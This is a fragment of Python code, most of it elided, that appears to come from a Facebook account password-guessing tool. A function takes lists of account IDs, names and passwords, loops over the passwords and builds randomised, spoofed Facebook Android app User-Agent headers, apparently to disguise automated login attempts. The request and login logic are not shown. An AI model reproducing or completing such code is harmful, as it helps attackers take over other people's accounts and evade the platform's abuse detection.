...
def m2(ids,names,passlist):
    ...
    try:
        ...
        for pw in passlist:
            ...
            headers={
                    'User-Agent': f"[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,80000000)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=3.0,width=1080,height=4096};FBLC/en_US;FBRV/193752944;FBCR/TM;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.%s;FBDV/RMX2173;FBSV/10;FBOP/4;FBCA/arm64-v8a:armeabi;]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(10000000,99999999))+";FBDM/{density=3.0,width=1080,height=4096};FBLC/en_US;FBRV/372281675;FBCR/GLOBE;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.%s;FBDV/RMX2099;FBSV/8;FBOP/7;FBCA/armeabi-v7a:armeabi;]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=2.3,width=1080,height=4096};FBLC/en_US;FBRV/826280402;FBCR/TM;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.%s;FBDV/RMX2068;FBSV/11;FBOP/9;FBCA/armeabi-v7a:armeabi;]"%(fbpnn),
              'Content-Type': 'application/x-www-form-urlencoded', 
